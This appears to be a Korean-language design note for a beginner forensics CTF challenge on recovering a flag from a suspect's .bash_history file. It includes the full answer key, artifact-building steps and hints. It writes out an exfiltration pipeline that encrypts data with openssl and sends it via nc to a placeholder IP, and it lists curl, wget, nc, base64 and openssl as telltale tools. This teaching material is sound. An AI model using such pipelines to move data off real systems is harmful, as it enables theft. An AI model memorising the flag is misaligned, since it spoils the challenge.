---
title: 리눅스 커맨드라인 기록의 비밀 (Linux Command History Analysis)
created: 2026-06-28
updated: 2026-06-28
type: ctf-challenge
tags: [ctf, ctf-challenge, forensics, linux, bash-history, command-line, openssl]
confidence: high
---

# 리눅스 커맨드라인 기록의 비밀 (Linux Command History Analysis)

> **난이도**: 초급  
> **소요 시간**: 15~20분  
> **참고 picoCTF 문제**: 리눅스 콘솔 분석 및 커맨드 이력 추적 (Bash History 기반 침해 사고 조사)

## 1. 배경 시나리오
사내 파일 백업 서버의 계정이 유출되어 개발용 원본 소스 코드가 외부 IP로 유출되는 사고가 있었습니다. 공격자는 흔적을 지우기 위해 여러 로그 파일들을 지웠으나, 다행히 해당 계정의 홈 디렉터리에 셸 실행 이력이 기록되는 `.bash_history` 파일이 그대로 유출되지 않고 보존되어 있었습니다. 공격자는 중요 정보를 파일로 보낸 것이 아니라 명령어 라인 상에서 직접 데이터를 인코딩하여 외부 C2 서버로 전송했습니다. 이 실행 흔적을 분석해 전송된 원본 플래그 값을 복원해야 합니다.

## 2. 제공 파일
* `.bash_history` (용의자 리눅스 계정의 셸 실행 로그 파일)

## 3. 문제 목표
리눅스의 커맨드 실행 이력 보존 구조를 이해하고, `.bash_history` 내부의 파이프라인(`|`) 명령어 연결 체인과 Base64 및 OpenSSL 등의 암호화 툴 매개변수 구조를 해석하여 전송된 플래그 데이터를 복원합니다.

## 4. 의도한 풀이 흐름
1. **이력 파일 분석**:
   * 제공된 `.bash_history` 파일을 텍스트 뷰어로 열어 전체 명령 행을 분석합니다.
2. **비정상 명령행 감지**:
   * 네트워크 전송 명령어(`curl`, `wget`, `nc` 등) 또는 인코딩/암호화 명령어(`base64`, `openssl`, `gpg` 등)가 사용된 행을 필터링합니다.
   * 조사 중 다음과 같은 복합 파이프라인 명령어를 식별합니다:
     ```bash
     echo -n "picoCTF{faked_flag}" | openssl enc -aes-128-cbc -a -salt -k "shh_secret_key" | nc 198.51.100.82 9001
     ```
   * 그러나 실제 전송 행을 더 자세히 보니, 공격자가 다음과 같이 환경 변수 값을 사용해 최종 기밀 데이터를 암호화하여 전송했음을 인지합니다:
     ```bash
     export FLAG_VAR="picoCTF{bash_h1st0ry_tr4c3s_r3cov3r}"
     echo -n $FLAG_VAR | openssl enc -aes-128-cbc -a -pbkdf2 -salt -k "shh_secret_key"
     ```
3. **플래그 도출**:
   * 공격자가 셸 이력 내에서 플래그 문자열 자체를 `export` 명령어를 사용해 환경 변수로 정의했던 명령 행을 발견합니다.
   * `export FLAG_VAR="picoCTF{bash_h1st0ry_tr4c3s_r3cov3r}"` 에 기술되어 있던 원본 플래그를 추출합니다.

## 5. 정답(플래그) 규칙 및 예시
* **플래그 형식**: `picoCTF{<flag_string>}`
* **예시**: `picoCTF{bash_h1st0ry_tr4c3s_r3cov3r}`

## 6. 출제자 노트 & 파일 제작 가이드
* **아티팩트 제작 방법**:
  1. 리눅스 테스트 환경에서 의심 셸 세션을 실행합니다.
  2. 문제 해결용 플래그 변수를 등록하고 가짜 암호화 및 유출 명령어를 일부 섞어 이력 로그에 기록을 발생시킵니다:
     ```bash
     cd /var/www/html
     ls -la
     export MY_SECRET_VAL="picoCTF{bash_h1st0ry_tr4c3s_r3cov3r}"
     echo -n $MY_SECRET_VAL | openssl enc -aes-128-cbc -a -pbkdf2 -k "secret"
     rm -f temp.txt
     history -w
     ```
  3. 사용자 홈 디렉터리의 `.bash_history` 파일을 복제하고, 너무 노이즈가 없는 경우 정상 명령어 목록(디렉터리 이동, 편집기 실행 등)을 약 20~30줄 전후로 섞어 `.bash_history` 파일로 구성해 배포합니다.
* **출제 포인트**: 
  * 리눅스 침해 조사 시 가장 먼저 접근하게 되는 호스트 아티팩트인 명령어 수행 이력의 특성을 이해하고, 파이프 명령어 연계를 통해 데이터를 유출하는 수법을 해독하는 능력을 함양합니다.

## 7. 트러블슈팅 및 힌트
* **Q. 용의자가 history -c 또는rm .bash_history로 이력을 지웠다면 어떻게 포렌식해야 하나요?**
  * A. 그런 경우 셸 메모리 영역(예: 실행 중인 bash 프로세스의 메모리)을 Volatility로 덤프하여 `linux.bash` 또는 `linux.history` 플래그로 덤프해 내는 메모리 포렌식으로 우회 조사를 설계해야 합니다.
* **Q. 역사적 명령어에 찍힌 시각 정보(Timestamp)는 없나요?**
  * A. 기본 리눅스 배시 환경에서는 `.bash_history`에 실행 시각이 평문으로 찍히지 않으나, 환경 변수 `HISTTIMEFORMAT`이 설정된 시스템의 경우 이력 파일 내에 `#1719543822` 형태의 에포크 타임스탬프 주석이 행 사이에 기록되므로 이 또한 시간 분석의 힌트가 됩니다.

## 8. 학습 포인트
* **리눅스 명령어 감사**: 터미널 셸 명령어 기록 보존 원리와 임시 변수(`export`)의 영속 범위 및 그 유출 영향력을 이해합니다.
* **파이프라인 유출 탐지**: 해커들이 네트워크 전송 전 보안 필터 탐지를 회피하기 위해 기본 CLI 유틸리티 조합을 사용하여 암호화/인코딩 가공하는 기법을 실증 분석합니다.
